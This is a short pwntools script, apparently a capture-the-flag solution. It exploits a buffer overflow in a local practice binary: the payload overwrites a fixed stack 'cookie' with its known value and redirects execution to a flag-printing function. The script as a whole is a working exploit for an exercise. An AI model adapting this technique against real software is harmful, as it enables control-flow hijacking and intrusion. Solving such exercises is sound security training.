from pwn import*

p = process('./Bufferoverflow-homemade-cookie-v1')

i = 0xc00c1e
cat_flag = 0x080484cb
payload = b"a"*16 + p32(i) + b"a"*12 +  p32(cat_flag)

p.sendline(payload)
p.interactive()
